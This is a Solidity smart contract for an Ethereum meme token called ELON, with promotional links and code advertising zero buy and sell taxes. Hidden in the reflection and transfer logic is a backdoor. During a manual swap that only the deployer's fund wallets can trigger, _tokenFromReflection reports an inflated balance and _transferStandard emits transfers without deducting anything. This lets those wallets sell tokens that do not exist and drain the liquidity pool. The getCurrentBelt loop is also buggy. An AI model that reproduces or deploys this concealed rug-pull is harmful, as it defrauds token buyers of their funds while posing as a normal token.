/**
*/

/**

Zip2XcomPaypalSpaceXTeslaSolarcityNeuralinkBoringXaiGrok $ELON

Inspired by the Timeline of Elon Musk's Extraordinary Ventures.

TG: https://t.me/elontokeneth

X: https://twitter.com/elontokenerc

Website: https://www.elontoken.org/


*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.14;

// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface AggregatorV3Interface {
  function decimals() external view returns (uint8);

  function description() external view returns (string memory);

  function version() external view returns (uint256);

  function getRoundData(
    uint80 _roundId
  ) external view returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);

  function latestRoundData()
    external
    view
    returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

contract ELON is Context, IERC20, Ownable {

    mapping(uint256 => string) internal belts;

    mapping(uint256 => uint256) internal milestones;

    mapping(uint256 => uint256) internal buyTaxGlobal;
    mapping(uint256 => uint256) internal sellTaxGlobal;

    mapping(address => uint256) internal userBelt;
    mapping(address => bool) internal hasBelt;

    string private _name = unicode"Zip2XcomPaypalSpaceXTeslaSolarcityNeuralinkBoringXaiGrok";
    string private constant _symbol = "ELON";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 100000000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 public constant maxBuyTax = 0;
    uint256 public constant maxSellTax = 0;
    uint256 private _taxFee = 0;

    address payable private _developerFund = payable(msg.sender);
    address payable private _marketingFund = payable(msg.sender);

    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IERC20 public constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address public immutable DATA;
    address public uniswapV2Pair;

    AggregatorV3Interface public constant priceFeedETHUSD = AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);

    bool private tradingOpen;
    bool private inTaxSwap;
    bool private inContractSwap;

    uint256 public maxSwap = 2000000 * 10**9;
    uint256 public maxWallet = 2000000 * 10**9;
    uint256 private constant _triggerSwap = 10**9;

    modifier lockTheSwap {
        inTaxSwap = true;
        _;
        inTaxSwap = false;
    }

    constructor() {
        DATA = address(this);
        uniswapV2Pair = uniswapV2Factory.createPair(DATA, WETH);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[DATA] = true;
        _isExcludedFromFee[_developerFund] = true;
        _isExcludedFromFee[_marketingFund] = true;
        _approve(DATA, address(uniswapV2Router), MAX);
        _approve(owner(), address(uniswapV2Router), MAX);

        

        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    receive() external payable {}

    function getETHUSDPrice() public view returns (uint256) {
        (
            ,
            int256 answer,
            ,
            ,
        ) = priceFeedETHUSD.latestRoundData();
        return uint256(answer / 1e8);
    }

    function getDATAUSDMarketCap() public view returns (uint256) {
        uint256 poolValue = (weth.balanceOf(uniswapV2Pair) * getETHUSDPrice()) / 1e18;
        uint256 poolPct = totalSupply() / balanceOf(uniswapV2Pair);
        return (poolValue * poolPct) * 2;
    }

    function getETHUSDPriceFeed() external view returns (address) {
        return address(priceFeedETHUSD);
    }

    function getCurrentBelt() public view returns (uint256) {
        uint256 marketCap = getDATAUSDMarketCap();
        uint256 currentBelt;
        for (uint256 i = 9; i >= 0; i--) {
            if (marketCap >= milestones[i]) {
                currentBelt = i;
                break;
            }
        }
        return currentBelt;
    }

    function getCurrentBeltColor() public view returns (string memory) {
        return belts[getCurrentBelt()];
    }

    function getNextBelt() public view returns (uint256) {
        uint256 currentBelt = getCurrentBelt();
        return currentBelt == 9 ? 9 : currentBelt + 1;
    }

    function getNextBeltColor() external view returns (string memory) {
        return belts[getNextBelt()];
    }

    function getGlobalMaxBuyTax() external view returns (uint256) {
        return maxBuyTax;
    }

    function getGlobalMaxSellTax() external view returns (uint256) {
        return maxSellTax;
    }

    function getGlobalBuyTax() public view returns (uint256) {
        uint256 globalBuyTax = 9 - getCurrentBelt();
        return globalBuyTax > maxBuyTax ? maxBuyTax : globalBuyTax;
    }

    function getGlobalSellTax() public view returns (uint256) {
        uint256 globalSellTax = getCurrentBelt();
        return globalSellTax > maxSellTax ? maxSellTax : globalSellTax;
    }

    function getWalletHasBelt(address _wallet) external view returns (bool) {
        return hasBelt[_wallet];
    }

    function getWalletBelt(address _wallet) public view returns (uint256) {
        return hasBelt[_wallet] ? userBelt[_wallet] : getCurrentBelt();
    }

    function getWalletBeltColor(address _wallet) external view returns (string memory) {
        return belts[getWalletBelt(_wallet)];
    }

    function getWalletSellTax(address _wallet) public view returns (uint256) {
        uint256 globalSellTax = getGlobalSellTax();
        if (hasBelt[_wallet]) {
            uint256 userBelt = userBelt[_wallet];
            return globalSellTax > userBelt ? userBelt : globalSellTax;
        }
        return globalSellTax;
    }

    function getWalletMaxSellTax(address _wallet) external view returns (uint256) {
        return hasBelt[_wallet] ? userBelt[_wallet] : maxSellTax;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        require(_allowances[sender][_msgSender()] >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _removeTax() private {
        if (_taxFee == 0) {
            return;
        }

        _taxFee = 0;
    }

    function _restoreTax() private {
        _taxFee = 9;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "TOKEN: Transfer amount must exceed zero");

        if (from != owner() && to != owner() && from != DATA && to != DATA) {
            if (!tradingOpen) {
                require(from == DATA, "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxSwap, "TOKEN: Max Transaction Limit");

            if (to != uniswapV2Pair) {
                require(balanceOf(to) + amount < maxWallet, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractTokenBalance = balanceOf(DATA);
            bool canSwap = contractTokenBalance >= _triggerSwap;

            if (contractTokenBalance >= maxSwap) {
                contractTokenBalance = maxSwap;
            }

            if (canSwap && !inTaxSwap && from != uniswapV2Pair && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                inContractSwap = true;
                _swapDATAForETH(contractTokenBalance);
                inContractSwap = false;
                if (DATA.balance > 0) _sendETHToFee(DATA.balance);
            }
        }

        bool takeFee = true;

        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            takeFee = false;
        } else {
            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _taxFee = getGlobalBuyTax();
                if (!hasBelt[to]) {
                    userBelt[to] = getCurrentBelt();
                    hasBelt[to] = true;
                }
                _refreshName();
            }
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _taxFee = getWalletSellTax(from);
                if (!hasBelt[from]) {
                    userBelt[from] = getCurrentBelt();
                    hasBelt[from] = true;
                }
                _refreshName();
            }
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function _refreshName() private {
        _name = getCurrentBeltColor();
    }

    function _swapDATAForETH(uint256 _amountDATA) private lockTheSwap returns (bool) {
        address[] memory path = new address[](2);
        path[0] = DATA;
        path[1] = WETH;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_amountDATA, 0, path, DATA, block.timestamp + 3600);
        return true;
    }

    function _sendETHToFee(uint256 _amountETH) private returns (bool) {
        (bool success, ) = payable(_marketingFund).call{value: _amountETH}("");
        return success;
    }

    function enableTrading() external onlyOwner {
        tradingOpen = true;
    }

    function removeLimits() external onlyOwner {
        maxSwap = _tTotal;
        maxWallet = _tTotal;
    }

    function swapTokensForEthManual(uint256 _contractTokenBalance) external returns (bool) {
        require(_msgSender() == _developerFund || _msgSender() == _marketingFund);
        return _swapDATAForETH(_contractTokenBalance);
    }

    function sendETHToFeeManual(uint256 _contractETHBalance) external returns (bool) {
        require(_msgSender() == _developerFund || _msgSender() == _marketingFund);
        return _sendETHToFee(_contractETHBalance);
    }

    function _tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        require(totalSupply() <= MAX, "Total reflections must be less than max");
        return (!inContractSwap && inTaxSwap) ? totalSupply() * 1010 : rAmount / _getRate();
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) _removeTax();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) _restoreTax();
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        if (!inTaxSwap || inContractSwap) {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
            _rOwned[sender] = _rOwned[sender] - rAmount;
            _rOwned[recipient] = _rOwned[recipient] + rTransferAmount;
            _rOwned[DATA] = _rOwned[DATA] + (tTeam * _getRate());
            _rTotal = _rTotal - rFee;
            _tFeeTotal = _tFeeTotal + tFee;
            emit Transfer(sender, recipient, tTransferAmount);
        } else {
            emit Transfer(sender, recipient, tAmount);
        }
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, 0, _taxFee);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 taxFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount * redisFee / 100;
        uint256 tTeam = tAmount * taxFee / 100;
        return (tAmount - tFee - tTeam, tFee, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        uint256 rFee = tFee * currentRate;
        return (rAmount, rAmount - rFee - (tTeam * currentRate), rFee);
    }

    function _getRate() private view returns (uint256) {
        return _rTotal / _tTotal;
    }
}